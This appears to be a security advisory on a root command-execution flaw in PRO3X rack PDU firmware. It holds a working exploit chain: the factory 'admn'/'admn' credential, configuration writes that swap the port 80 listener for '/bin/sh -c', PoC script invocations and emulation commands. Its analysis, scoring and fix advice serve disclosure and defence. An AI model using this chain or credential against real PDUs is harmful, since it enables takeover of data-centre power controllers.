# Server Technology PRO3X Rack PDU - Authenticated Listener Program Override in port_mux Leading to Root Command Execution

## 1. Overview

Server Technology Inc. (Reno, Nevada, USA; a Legrand group company) produces the PRO3X series of intelligent rack power distribution units - closed-source appliances that measure, monitor and switch power for server racks in data centres and other critical-infrastructure rooms. This research covers firmware `spdu-pro3x-030600` (build 46640), an ARM 32-bit uClibc Linux system (kernel string `4.19.86-sama`, SAMA5D2/D3 Cortex-A5 SoC) with a zstd-compressed Squashfs root filesystem of roughly 9.5 MB. Our research record enumerates no product-specific public advisory identifiers for this target, so the work described here was carried out against the firmware image alone.

All management is network-based. A vendor-patched BusyBox `httpd` v1.31.1 listens on port 80 (the `httpredir` redirector), port 443 (`httpd`, `ssl_force`) and port 8181 (a local listener). The patched `httpd` carries a custom `J/` handler that hands the accepted socket descriptor to a separate JSON-RPC dispatcher, `jsonrpcd` (a ~725 KB ARM ELF), using `sendmsg` with SCM_RIGHTS ancillary data over the Unix `SOCK_DGRAM` socket `/tmp/jsonrpcd`. Roughly 40 JSON-RPC namespaces - `J/auth`, `J/cfg`, `J/bulk`, `J/test`, `J/net`, `J/firmware`, `J/display`, `J/security`, `J/datetime`, `J/eventlog`, `J/luaservice`, `J/cascade`, `J/model` and others - are mapped to that dispatcher in `/etc/httpd.conf`. Configuration state lives in `cfgd` (Unix socket `/tmp/cfgd-socket`), validated against CDL schemas in `/etc/cfgd/`, among them `cfg_pmux.cdl`.

Above this stack sits `port_mux` (`$R/bin/port_mux`, where `$R` is the extracted firmware root filesystem), an inetd-style service launcher. It binds the protocol listeners described by the `proto_listener` configuration and, for every inbound TCP connection, forks and starts the configured listener program. Two properties of that launcher combine into a full compromise:

1. `port_mux` never drops privileges. There is no `setuid`, `setgid` or `getpwnam` call anywhere on the path to `execv`, so each listener process inherits the uid 0 identity of the launcher itself.
2. The `program` field naming the executable is an unconstrained free-form string in the configuration schema - no path whitelist, no executability check, no traversal filtering - and it is writable by an authenticated administrator through the `setConfiguration` method of the `J/cfg` namespace.

The resulting chain is three HTTP/TCP steps: authenticate as administrator, overwrite the `http` listener's program with `/bin/sh` plus an attacker-chosen argument vector, then open a TCP connection to port 80. `port_mux` reloads the listener configuration at runtime (no reboot, no service restart), forks on the incoming connection, and executes the injected program as root with the socket bound to stdin and stdout. What was dynamically verified is the root execution primitive - `port_mux` forking and `execv`ing an injected `/bin/sh -c` as uid 0, exercised under emulation against the device's own daemons - and the marker file that primitive produced is owned by `root:root` and contains `uid=0(root) gid=0(root) groups=0(root)`. The three HTTP/TCP steps above were verified component by component rather than end to end on a device; section 9 states precisely what was exercised and what was not.

## 2. Vulnerability Summary

- **Class**: authenticated configuration injection reaching an unprivileged-free `execv` - arbitrary command execution as root.
- **Root cause 1 (CWE-269)**: `port_mux` starts every protocol listener with `fork` + `execv` while still uid 0; no privilege drop is performed for the `http`, `https`, `ssh`, `telnet`, `modbus` or any other listener.
- **Root cause 2 (CWE-78)**: the listener program path is user-writable configuration. `proto_listener_entry.program` is typed `nctl_nspc_nempty_str_512` - "non-empty string, at most 512 characters" - and accepts any value, including a shell interpreter.
- **Delivery**: `POST /J/auth` (`login`) to obtain a session token, then `POST /J/cfg` (`setConfiguration`) to write `proto_listener._e_.http.program` and `proto_listener._e_.http.program_args`.
- **Trigger**: any TCP connection to the rearmed listener port (80 by default); the injected `/bin/sh -c` runs once per connection.
- **Execution identity**: root, uid 0 - dynamically confirmed.
- **Precondition**: a valid administrator credential (`adminPrivilege` / `configure` privilege). The chain does not require the shipped default credential, but a shipped default for exactly this role does exist and is discussed in section 3 and scored in section 12.

| Item | Value verified by this research |
|---|---|
| Vendor | Server Technology Inc. (Legrand group) |
| Product | PRO3X series rack power distribution unit |
| Firmware | `spdu-pro3x-030600` |
| Build | 46640 |
| Platform | ARM 32-bit, uClibc, `4.19.86-sama`, SAMA5D2/D3 Cortex-A5, zstd Squashfs root filesystem |
| Remote entry | HTTP/HTTPS management interface (`J/auth`, `J/cfg`) |
| Result | Arbitrary command execution as root (uid 0) |

## 3. Authentication Boundary

`jsonrpcd` recognises three credential carriers, evaluated in `common_functions.auth()`:

- a session token, supplied as `X-Session-Token` or the `session` form field, checked with `session -t`;
- HTTP Basic authentication, checked with `auth_cli checkpw64` / `checkpriv64`;
- a cascade master token (`X_CASCADE_AUTH`, validated by `cascade_auth`), which does not exist in a factory-default configuration.

Anything else returns 401. Inside the dispatcher the gate is unconditional: `0x8bf10` (dispatch) -> `0x8c380` (authenticate) -> `0x8c3c8` (401 for every method outside the whitelist) -> `0x8b66c` (route resolution) -> `0x89580` (`processRequest`, reached only after successful authentication). Exactly 11 methods are whitelisted for unauthenticated callers: `login`/`authenticate`, `newSession`, `getCurrentSession`, `closeSession`, `closeCurrentSession`, `touchCurrentSession`, `getSingleLoginLimitation`, `getAuthType`, `needDefaultPasswordChange`, `serviceauthorization` and `captureToken`.

`setConfiguration` is **not** in that list. The role required is therefore a full **administrator** account holding `adminPrivilege` / `configure` rights - not a read-only or operator-tier account. Reverse engineering of the authentication gate found no bypass: none of the 11 whitelisted methods reaches a command-execution sink, and the cascade-token route is inert at factory default because `cascade.master.token` is absent (`cascade_auth` exits 2).

One whitelisted method needs a caveat, because the research record behind it is not self-consistent. `serviceauthorization` validates a hardcoded service-authorization value and, on success, returns a boolean and nothing else - no session, no privilege, no path to code execution. One part of the record lists it among the methods any unauthenticated caller may invoke; the reverse-engineering notes for the same method state instead that it requires administrator privilege first and is therefore not reachable unauthenticated. That conflict is disclosed here rather than resolved, and it changes nothing for this chain: under either reading the method yields only a boolean, which is the property that matters.

Two further facts define the boundary precisely.

**A shipped default credential exists for this role.** `/lib/lua/pp_features.lua:13-14` and `/lib/sysconf/pp_features.sh:12` define `PP_CONFIG_DEFAULT_LOGIN = "admn"` and `PP_CONFIG_DEFAULT_PASSWORD = "admn"`; `auth_cli checkpw64 "admn:admn"` returns `admn` with exit status 0, i.e. the credential is accepted, and `needDefaultPasswordChange` exists to track whether it has been rotated. The chain documented here does not depend on that default - any valid administrator credential satisfies the precondition - but on a unit that still carries the factory password the privileged precondition is met by anyone who can reach the management port. Both readings are scored in section 12.

**There is no legitimate administrator shell on this device.** In `/etc/passwd` the `root` entry's password hash is not a known public default, and no `admin` Unix account exists; the `ssh` listener is forced through `exec /bin/cli_main` and the `telnet` listener through `/bin/cli_login`, both restricted CLIs rather than a general shell; the web interface exposes only the JSON-RPC configuration surface, with no terminal feature. Administrator access therefore never legitimately yields root command execution, which is what makes the listener-override primitive a boundary crossing (administrator to root) rather than an exposed-by-design capability.

## 4. Attack Surface

The reachable surface is the HTTPS/HTTP management interface on ports 80 and 443. The research record states that both of those listeners carry `listen_type=any` in the default configuration - bound outward-facing rather than restricted to loopback - but no configuration-layer artifact is cited for that statement: the record points to no extracted configuration file or line number for it and shows no configuration read-back of it, and the extracted default-listener table reproduced below carries no `listen_type` column of its own. Because the statement is load-bearing for `AV:N`, it is attributed here to the research record rather than presented as artifact-level proof. That is a deliberate contrast with the factory `admn`/`admn` credential in section 3, which is anchored to two extracted files with line numbers and literal source constants.

The default `proto_listener` set defines both the entry points and the trust model of the launcher:

| Listener | Port | Program | Listen type | Encryption | Enabled | Arguments |
|---|---|---|---|---|---|---|
| http | 80 | `//sbin/httpredir` | - | `ssl_none` | yes | `[-i]` |
| https | 443 | `//sbin/httpd` | - | `ssl_force` | yes | `[-i]` |
| localhttp | 8181 | `//sbin/httpd` | `local` | - | yes | `[-i]` |
| mbusd | 503 | `//bin/false` | - | - | no | - |
| modbus | 502 | `//bin/modbusd` | - | - | no | - |
| ssh | 22 | `//bin/dropbear` | - | - | yes | `[-i, -C, "exec /bin/cli_main"]` |
| telnet | 23 | `//bin/telnetd` | - | - | no | `[-i, -l, /bin/cli_login]` |

The listen-type column is populated for `localhttp` only. `local` is not a member of the `encryption` enumeration quoted in section 6 (`ssl_try`, `ssl_force`, `ssl_none`) but of `listen_type`'s (`local`, `any`), which is the field it belongs to; a dash means the extracted table records no value for that listener. Fields an authenticated administrator controls on any of these entries include `program`, `program_args`, `port`, `listen_type`, `encryption` and `enabled`. The `http` entry is the most convenient target: it is enabled by default, sits on port 80, and the record describes it as already outward-facing.

The authenticated surface is large (roughly 40 namespaces covering configuration, firmware, network, security, event log and cascade behaviour), but the decisive property is that `J/cfg` writes into the same configuration database that `port_mux` consumes. Unauthenticated reachability was assessed and judged absent: the 11 whitelisted methods reach no execution sink; of the 19 CGI endpoints found on the device the 4 reachable without authentication contain no sink; the cascade-authentication route fails at factory default; the Lua service engine (`luaserviced`) offers no unauthenticated remote code execution; and an adversarial re-analysis that matched every candidate path against a 12-pattern reference injection library left no untried route. Unauthenticated code execution is therefore treated as unreachable in this firmware, with the obvious reactivation conditions being a new unauthenticated CGI carrying a sink or a weakened `jsonrpcd` gate.

## 5. Sink Identification

### Sink identification: `handleConnectionNative` in `port_mux`

The sink is the child-process entry point of `/bin/port_mux` (ARM ELF), the function that turns an accepted connection into a running listener:

```
$R/bin/port_mux
  fork                 @ 0x158a0   accept loop; parent accepts, child continues below
  handleConnectionNative @ 0x16440  noreturn child entry
    read listener "program" and "program_args" from configuration
    log  "program: %s"  /  "arg: %s"
    malloc and populate the argv array
    make the accepted socket fd stdin/stdout (setCloseOnExec handling)
    execv              @ 0x165f0   start "program" with "program_args"
```

Reconstructed in C-like form, the child does the following and nothing else before handing control to the configured program:

```c
/* handleConnectionNative - simplified from the disassembly */
cfg_get(listener, "program", program);            /* free-form string, no whitelist */
cfg_get_vec(listener, "program_args", args);      /* vector<nctl_str_512, int, 32> */
log("program: %s", program);
for (i = 0; args[i]; i++) log("arg: %s", args[i]);
argv = malloc((i + 2) * sizeof(char *));
argv[0] = program; memcpy(argv + 1, args, ...); argv[i + 1] = NULL;
dup2(conn_fd, 0); dup2(conn_fd, 1);               /* socket becomes stdin/stdout */
execv(program, argv);                             /* no setgid, no setuid, no getpwnam */
```

The decisive observation is what is absent. Between `fork` at `0x158a0` and `execv` at `0x165f0` there is no `setgid`, no `setuid` and no `getpwnam` - no transition away from the identity of the launcher. `port_mux` itself runs as root, so every listener it starts, including the standard `httpd`, `dropbear`, `telnetd` and `modbusd` processes, runs as root as well. Listener daemons are exactly the class of process that should switch to a dedicated service account before serving network input; here the switch never happens, and the binary path it would follow is attacker-writable.

Configuration changes are picked up at runtime. `port_mux` subscribes to configuration notifications (`cfg::ChangeHandlerRegistry` / `CfgNotifyListener`) and re-arms the affected listener, recording state in `//var/run/muxed_services.txt`. No reboot and no restart of the management stack is needed for the injected program to take effect.

## 6. Source Identification

### Source identification: `setConfiguration` writing `proto_listener.program`

The source is the `setConfiguration` method of the `cfg` namespace, reached through `POST /J/cfg`. The schema that governs the written value is `$R/etc/cfgd/cfg_pmux.cdl`:

```c
proto_listener_entry: struct {
    port: tcp_port;
    listen_type: port_listen_type enum { local, any };
    protocol_name: enum { rfb, msp, rap };
    program: nctl_nspc_nempty_str_512;   /* free-form string, no whitelist */
    program_args: vector<nctl_str_512, int, 32>;
    encryption: enum { ssl_try, ssl_force, ssl_none };
    use_hsts: boolean;
    enabled: boolean;
    administratively_disabled: boolean;
}
```

Every other field in the structure is a constrained type: the port is a `tcp_port`, `listen_type` and `encryption` are enumerations, `protocol_name` is an enumeration of three values, and the two flags are booleans. `program` alone is `nctl_nspc_nempty_str_512` - a non-empty string of at most 512 characters. It carries no path whitelist, no check that the value is an executable, and no filtering of traversal sequences; `program_args` is an equally free vector of up to 32 strings. A schema whose surrounding fields are tightly typed but whose executable-path field is an open string is the defect, independent of any single value an attacker might choose.

The write path is: `POST /J/cfg` -> `jsonrpcd` (`cfg` namespace) -> `cfgd` over `/tmp/cfgd-socket` (validated only by `cfg_pmux.cdl`) -> `proto_listener._e_.<name>.program` / `program_args` in the configuration store -> `CfgNotifyListener` -> `port_mux` re-arms the listener. The same store is readable through the `cfgc` client, which is how the injection was confirmed from the device side.

## 7. Data Flow

```
attacker  POST /J/auth            method=login, administrator credential
   |      jsonrpcd authenticate -> issues session token
   v
attacker  POST /J/cfg             method=setConfiguration, X-Session-Token
   |      httpd "J/" handler -> SCM_RIGHTS descriptor pass -> jsonrpcd
   |      0x8bf10 dispatch -> 0x8c380 authenticate (token accepted)
   |      -> 0x89580 processRequest -> cfg namespace, setConfiguration
   v
cfgd      (/tmp/cfgd-socket, schema /etc/cfgd/cfg_pmux.cdl)
   |      write proto_listener._e_.http.program       = /bin/sh
   |      write proto_listener._e_.http.program_args[0] = -c
   |      write proto_listener._e_.http.program_args[1] = "<cmd> > /tmp/portmux_rce_marker 2>&1; echo PORTMUX_RCE_OVER_SOCKET"
   |      CfgNotifyListener -> port_mux ChangeHandlerRegistry
   v
port_mux  reloads the http listener (runtime, no reboot)
   |      attacker opens TCP connection to port 80
   |      fork @ 0x158a0 -> child handleConnectionNative @ 0x16440
   |      socket fd becomes stdin/stdout
   |      execv @ 0x165f0 ("/bin/sh", ["-c", "<cmd> ..."])   <-- uid 0, no privilege drop
   v
root command execution -> marker file written, sentinel echoed back over the socket
```

The attacker-controlled data crosses one trust boundary (authenticated administrator to device configuration) and one privilege boundary (root-owned launcher to root-owned child). Nothing on the path inspects the value semantically: `cfgd` applies the CDL type (`nctl_nspc_nempty_str_512`), `port_mux` copies the string into `argv[0]` and calls `execv`.

## 8. Exploit Construction

### Exploit construction: rearming the port 80 listener

The PoC modifies the `http` entry - enabled by default and outward-facing on port 80:

```
proto_listener._e_.http.program           = /bin/sh
proto_listener._e_.http.program_args._e_.0 = -c
proto_listener._e_.http.program_args._e_.1 = id > /tmp/portmux_rce_marker 2>&1; echo PORTMUX_RCE_OVER_SOCKET
```

After the reload, port 80 no longer runs `//sbin/httpredir`; it runs a shell. Each TCP connection to port 80 makes `port_mux` fork and `execv("/bin/sh", ["-c", "<cmd> > /tmp/portmux_rce_marker 2>&1; echo PORTMUX_RCE_OVER_SOCKET"])` with stdin and stdout attached to that connection. The command writes its output to the marker file, and the trailing `echo` returns a sentinel string over the socket, so the operator gets confirmation without any filesystem access on the device. Because the child inherits the launcher's identity, all of it happens as uid 0.

Substituting the argument vector would turn the listener into an interactive root shell over TCP instead of a one-shot command - the same primitive, with the command string left empty and a shell spawned on the socket. That interactive variant was not constructed and was not exercised in this research; only the one-shot form was. The reference PoC in `exploit/servertech_pro3x_port_mux_rce.py` implements the one-shot form over the real HTTP path: login, `setConfiguration`, then a raw socket to the trigger port. Example use against a laboratory target:

```
python3 exploit/servertech_pro3x_port_mux_rce.py --target 127.0.0.1 --port 443 \
    --user <admin-user> --password <admin-pass> --command id
python3 exploit/servertech_pro3x_port_mux_rce.py --target 127.0.0.1 --port 80 --no-tls \
    --user <admin-user> --password <admin-pass> --command id
```

### Exploit construction: why this is not an exposed-by-design capability

The `program` field is documented by the schema and populated by the factory default with the path of a listener daemon (`//sbin/httpredir`, `//sbin/httpd`, `//bin/dropbear`, `//bin/telnetd`, `//bin/modbusd`). Its meaning is "the binary that serves this protocol", not "a command the administrator may specify". An administrator has no other route to a root shell (section 3), so being able to make the device execute `/bin/sh -c` as uid 0 is a privilege escalation from the administrator role, not a documented management function.

## 9. Dynamic Verification

### Dynamic verification: environment

Verification ran on an x86-64 laboratory host (`<lab-host>`) using `qemu-arm-static` in user mode (binfmt_misc enabled), with `-L $R` pointing at the root filesystem unpacked from the firmware Squashfs image. `port_mux` and its listeners were started inside a separate network namespace (`unshare -n`) so that the device's own listeners could not collide with the host's SSH port. The primitive test performs the same configuration writes that `setConfiguration` performs, using the device's own `cfgc` client against a live `cfgd`:

```sh
R=<rootfs>
Q="qemu-arm-static -L $R $R/bin/cfgc"
$Q set "proto_listener._e_.http.program=/bin/sh"
$Q set "proto_listener._e_.http.program_args._e_.0=-c"
$Q set "proto_listener._e_.http.program_args._e_.1=LC_ALL=C id > /tmp/portmux_rce_marker 2>&1; echo PORTMUX_RCE_OVER_SOCKET"
unshare -n sh -c 'ip link set lo up 2>/dev/null; exec qemu-arm-static -L "'"$R"'" "'"$R"'/bin/port_mux"' > /tmp/pm_ns.log 2>&1
echo "" | timeout 5 qemu-arm-static -L "$R" "$R/bin/busybox" nc 127.0.0.1 80
ls -l /tmp/portmux_rce_marker; cat /tmp/portmux_rce_marker
```

### Dynamic verification: results

The primitive was run twice. Both runs produced the same result lines; what differs between them is the marker file's timestamp, and no timestamp is reproduced in any block in this advisory - the recorded listing line carried one and it is omitted here. The repeat run also confirms the idempotency of the harness cleanup, which kills a stale `port_mux` singleton before each run. The two blocks below are the tails of the two recorded runs, with the startup lines emitted ahead of the marker check omitted:

```
[+] marker file: /tmp/portmux_rce_marker (owner=root:0, mode=644)
[+] marker content: uid=0(root) gid=0(root) groups=0(root)
[+] RCE primitive confirmed: uid=0(root) - port_mux execv as root.
EXIT1=0
```

```
[+] marker file: /tmp/portmux_rce_marker (owner=root:0, mode=644)
[+] marker content: uid=0(root) gid=0(root) groups=0(root)
[+] RCE primitive confirmed: uid=0(root) - port_mux execv as root.
EXIT2=0
```

```
-rw-r--r-- 1 root root 38 /tmp/portmux_rce_marker
uid=0(root) gid=0(root) groups=0(root)
```

The marker is owned by `root:root`, is 38 bytes, and contains the uid 0 identity line; the sentinel `PORTMUX_RCE_OVER_SOCKET` came back over the port 80 socket. Read-back through the device's own client confirms the injected values were stored, not merely accepted:

```
$ cfgc get proto_listener._e_.http.program
proto_listener[http].program=/bin/sh
$ cfgc get proto_listener._e_.http.program_args._e_.1
proto_listener[http].program_args[1]=LC_ALL=C id > /tmp/portmux_rce_marker 2>&1; echo PORTMUX_RCE_OVER_SOCKET
```

### Dynamic verification: HTTP path components and honest limitation

Because httpd and jsonrpcd run as two separate `qemu-arm-static` processes in user mode, SCM_RIGHTS descriptor passing between them does not complete in the emulator - `httpd` answers 501 and the `jsonrpcd` log stays empty. This is an emulation-environment limitation, not a property of the vulnerability: on hardware both processes share one kernel, where descriptor passing is a native mechanism. Each link of the HTTP delivery path was therefore verified individually:

| Component | Verification | Result |
|---|---|---|
| `httpd.conf` routing | inspect `/etc/httpd.conf` | `J/cfg:/tmp/jsonrpcd` and ~40 namespace mappings present |
| BusyBox `J/` patch | `strings` on the BusyBox binary | `sendmsg` / SCM_RIGHTS descriptor passing present |
| Administrator credential accepted | `auth_cli checkpw64 "admn:admn"` | returns `admn`, exit 0 |
| Configuration write accepted | `cfgc set "proto_listener._e_.http.program=/bin/sh"` | accepted; read-back shown above |
| Listener executed as root | socket trigger on port 80 | uid 0 marker confirmed |

Stated plainly: the end-to-end HTTP chain (`POST /J/auth` + `POST /J/cfg` + TCP trigger) was **not** exercised against physical hardware in this research. What is dynamically proven is the root execution primitive - `port_mux` `fork` + `execv` of an injected `/bin/sh -c` as uid 0 - together with independent confirmation of every component of the HTTP path that delivers it.

## 10. Reachability and Security Impact

### Reachability

The research record states that both management listeners use `listen_type=any`, attributed there to the record rather than to a cited configuration artifact as explained in section 4, so ports 80 and 443 would be reachable by any host that can route to the unit - in practice the data-centre management network, where a rack PDU is normally reachable from operations tooling and jump hosts. The whole chain is ordinary HTTPS traffic: one login request, one configuration write, one TCP connection. No SSH, serial console or local filesystem access is required; no request smuggling, race condition or memory corruption is involved; and no user interaction on the device is needed. The only precondition is a valid administrator credential, and section 3 documents that the factory credential for that role is `admn/admn` on units that were never re-provisioned.

### Impact on the managed power plane

An administrator who uses this primitive becomes root on the power-distribution controller. What that means physically is specific to this class of device: the PRO3X is a rack power distribution unit, the appliance class used for power monitoring and control in data centres and other critical-infrastructure rooms, and it administers the power fed to the equipment in the racks it serves. Root on its controller puts that management plane entirely under attacker control. The verification in this research proves arbitrary root command execution on the controller and read/write control of its configuration database; it does not separately exercise per-outlet switching, so power cycling and outlet cut-off are described here as the function the controller administers and the top of that trust hierarchy, not as a step this PoC demonstrates.

Beyond the power plane, root on the controller also means:

- **Full configuration control** - the same `setConfiguration` surface manages network settings, security policy, event logging and the listener set, so an attacker can reshape the device's own management exposure and turn off the observability that would report it.
- **Spare listeners as covert channels** - `mbusd` (port 503) and `modbus` (port 502) are present but disabled by default (`//bin/false`, `//bin/modbusd`); they can be armed with an attacker-chosen program, opening management-plane ports that operational monitoring does not expect to be in use.
- **Durable configuration write** - the injected listener entry is stored in the device configuration (confirmed by `cfgc get` read-back), not held only in process memory, so the rearmed listener remains configured after the injected shell exits.
- **A root foothold in critical-infrastructure space** - the unit is a management-plane appliance serving racks of production equipment; compromising it is a privileged position relative to everything the racks host.

Availability risk is inherent in the primitive itself: the injected program replaces whatever previously served the port, so arming port 80 with a one-shot shell removes the redirector service - a reminder that the same write can take management or protocol services offline at will.

### Reachability scope

The verified scope is firmware `spdu-pro3x-030600` (build 46640) on the PRO3X series. Our record documents extraction and dynamic testing for that firmware only; no other firmware version was tested and no other model is claimed. The design pattern (a root-owned inetd-style launcher consuming a configuration schema whose executable-path field is an unconstrained string) is not specific to one product, so other models sharing this launcher and schema lineage may behave identically - but that is an inference about shared code, not a finding, and it would have to be established per model before being asserted.

## 11. Fix Recommendations

1. **Drop privileges in `port_mux` before `execv`.** Resolve a per-protocol, non-root service account from `protocol_name` / the listener type (for example an `httpd` account for the web listeners, an `sshd` account for the SSH listener) and `setgid`/`setuid` to it in the child after binding the socket but before `execv`. Refuse to start any listener as uid 0. This alone removes the privilege half of the defect and keeps every other listener's behaviour.
2. **Constrain `program` in `cfg_pmux.cdl`.** Replace `nctl_nspc_nempty_str_512` with a closed enumeration of the known listener binaries (`//sbin/httpredir`, `//sbin/httpd`, `//bin/dropbear`, `//bin/telnetd`, `//bin/modbusd`, `//bin/false`). A free-form string is only defensible for fields with no execution semantics.
3. **Validate at the `setConfiguration` boundary.** Canonicalise the supplied path, require it to resolve to an existing executable, and require it to match the whitelist; reject shell interpreters (`/bin/sh`, `/bin/bash`, BusyBox applet invocations) outright. Reject `program_args` entries containing shell metacharacters, and reject a leading `-c` argument for any listener.
4. **Enforce the default-password gate.** `needDefaultPasswordChange` already tracks whether the factory `admn` credential was rotated; block configuration writes - ideally all management operations beyond the password change itself - while it is still set, and remove the shared factory credential from shipped firmware in favour of a per-device unique value.
5. **Make listener mutation visible.** Emit an operator-visible event (the device already has an event-log namespace) whenever `proto_listener.program` or `program_args` changes, and log the identity that made the change, so a rearmed listener is detectable by monitoring rather than only by inspection.
6. **Address the companion hardcoded-credential items.** The factory `admn`/`admn` credential (`pp_features.lua:13-14`) is CWE-798 and is reported separately. The hardcoded `schroffService` service-authorization value (`etc/cfgd/default:640`, a 72-byte SHA-512 digest computed over the password concatenated with a salt) is checked by the `serviceauthorization` method; whether that method is callable before authentication is recorded inconsistently in the research record, as section 3 discloses. On either reading it was reversed and grants nothing beyond a boolean result - no session, no privilege, no path to code execution - but a shipped hardcoded authorization value should still be removed.

## 12. CWE and CVSS

**CWE classification.**

- **CWE-78, Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")** - primary. The configuration-injection variant: an authenticated, attacker-controlled configuration value is used as the executable path and argument vector handed to `execv`, with the argument string additionally consumed by a shell invoked as `/bin/sh -c`.
- **CWE-269, Improper Privilege Management** - co-primary root cause. The launcher performs no privilege transition for any listener process, so root identity is the default execution context for network-facing services.
- **CWE-798, Use of Hard-coded Credentials** - secondary, reported as an independent item. The factory `admn`/`admn` administrator credential and the hardcoded `schroffService` service-authorization hash.

**CVSS.** The primary score is **7.2 (High)** with the vector **CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H**. Where a unit still carries the factory default administrator credential, the administrator precondition is not a barrier and the finding scores **9.8 (Critical)** under `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Metric-by-metric justification of the primary vector:

- `AV:N` - the delivery path is HTTP/HTTPS on ports 80/443, which the research record describes as outward-facing listeners (`listen_type=any`, attributed to the record rather than to a cited configuration artifact); nothing in the chain needs local or adjacent access.
- `AC:L` - three deterministic steps (login, configuration write, TCP connect); no race, no special device state, no prerequisite configuration beyond the default enabled listener.
- `PR:H` - `setConfiguration` requires a full administrator (`adminPrivilege` / `configure`); it is outside the 11-method unauthenticated whitelist and the gate was verified unbypassed.
- `UI:N` - the triggering connection is opened by the attacker, not by any device user.
- `S:U` - the compromise lands on the managed device itself; the vulnerable component and the impacted component are the PDU's own management authority.
- `C:H` / `I:H` / `A:H` - root on the controller reads all configuration and telemetry, writes and executes arbitrarily, and can disable or repurpose device services including the management listeners.

**Derivation and score/vector consistency.** With all three impact metrics High, the impact sub-score is `ISS = 1 - [(1 - 0.56)(1 - 0.56)(1 - 0.56)] = 0.914816`; for unchanged scope, `Impact = 6.42 x ISS = 5.873119`. Exploitability is `8.22 x AV(0.85) x AC(0.77) x PR x UI(0.85)`. Verified arithmetic:

| Precondition | PR weight | Exploitability | Base (Roundup of Impact + Exploitability) |
|---|---|---|---|
| High (administrator), as documented | 0.27 | 1.234708 | 7.2 |
| Low | 0.62 | 2.835255 | 8.8 |
| None | 0.85 | 3.887043 | 9.8 |

Only the `PR:H` row is reachable through the interface as shipped: `setConfiguration` demands a full administrator, so no lower-privileged principal can rewrite the listener path, and the `PR:L` row - the one that would produce 8.8 - is therefore rejected rather than reported. Two readings are carried together, and they differ only in whether the operator has rotated the factory credential:

- **Authenticated administrator reading (primary)**: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2 High**. The attacker must hold `adminPrivilege` / `configure`. Remediation priority is not diminished by the score: the fix is a privilege drop plus an executable whitelist, because the defect turns an administrator into the operating system.
- **Unchanged factory-credential reading (unauthenticated-equivalent)**: any attacker who can reach the management port holds the administrator role, so the precondition collapses to `PR:N` - `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 Critical**. Units still on the shipped default should be treated at this severity until the credential is rotated, independent of the listener defect being patched.

**Affected scope.** Firmware `spdu-pro3x-030600`, build 46640, PRO3X series rack PDU. No other firmware build or model was tested and none is claimed; the shared-code caveat in section 10 applies.

**Independence.** This work is original: the sink (`handleConnectionNative`, `fork` and `execv` at the offsets given in section 5), the schema defect (`program: nctl_nspc_nempty_str_512` in `cfg_pmux.cdl`), the dispatcher authentication gate and its 11-method whitelist, the write path through `setConfiguration` / `cfgd`, and the dynamic uid 0 confirmation were all established in this research from the firmware image and a live emulated instance of the device's own daemons. Our record enumerates no product-specific public advisory identifier for this target, and no prior public writeup was used as a basis, replicated, or re-packaged here. No CVE identifier is cited because none is cited by the research; the companion findings (default credential, hardcoded service-authorization hash) are reported as separate items and are not part of this chain.

---

Advisory: https://0day-rubbish.com/blog/servertech-pro3x-port-mux-command-injection
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com
